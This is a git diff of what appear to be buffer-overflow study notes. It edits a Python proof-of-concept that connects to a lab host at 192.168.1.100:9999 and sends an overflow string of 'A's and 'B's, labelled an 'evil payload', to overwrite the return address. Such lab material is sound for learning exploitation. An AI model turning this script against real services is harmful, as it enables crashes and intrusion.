@@ -330,29 +330,23 @@ except:
 
 - **No comment version:**
 
-```python  
+```python   
 #!/usr/bin/python
-
+    
 import socket
 import sys
-
-username = b"fz3r0"
-message = b"A" * 2012 + b"B" * 4
-
-try:        
-        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(('192.168.1.100',9999))      
-        s.recv(1024)
-        s.recv(1024)
-        s.send(username + b'\r\n')
-        s.recv(1024)
-        s.send(message + b'\r\n')    
-        s.recv(1024)
-        s.close()
         
+gate_string = b"A" * 146 + b"B" * 4
+
+try:            
+        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(('192.168.1.100',9999))
+        s.send(gate_string + b'\r\n')
+        s.close()
+
 except:
-        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
+        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Don't ask me, I'm just a script!!! >.<")
         sys.exit()
 ```
 
